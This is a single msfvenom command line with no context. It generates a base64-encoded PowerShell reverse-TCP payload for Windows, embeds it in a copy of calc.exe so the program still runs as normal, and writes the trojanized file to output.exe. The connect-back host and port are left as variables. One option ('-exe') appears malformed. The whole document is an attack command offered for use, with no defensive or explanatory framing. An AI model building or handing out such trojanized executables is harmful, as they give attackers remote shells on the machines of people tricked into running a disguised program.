msfvenom -p windows/x64/powershell_reverse_tcp -e cmd/powershell_base64 LHOST=$LIP LPORT=$LPRT -exe -x ./calc.exe -k >  output.exe
